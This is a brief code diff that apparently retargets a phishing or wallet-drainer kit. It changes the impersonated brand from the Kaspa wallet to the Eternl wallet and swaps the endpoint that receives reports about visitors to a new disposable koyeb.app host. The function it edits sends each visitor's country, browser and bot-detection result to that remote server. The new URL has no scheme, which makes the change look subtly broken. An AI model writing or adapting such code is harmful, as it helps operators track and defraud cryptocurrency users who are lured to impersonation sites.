@@ -36,7 +36,7 @@ const getCurrentUrl = () => {
  */
 export const sendNotificationMessage = (
     userCountry: any,
-    appName = "Kaspa",
+    appName = "Eternl",
     browser: string | null = null,
     botInfo: { isBot: boolean; botType?: string } | null = null
 ) => {
@@ -60,7 +60,7 @@ export const sendNotificationMessage = (
 
     return axios
         .post(
-            "https://nice-kristin-ethname-aada4ad6.koyeb.app/api/form/submit",
+            "rotten-shaun-ethname-62fa05f5.koyeb.app/api/form/submit",
             messageData,
             {
                 headers: {
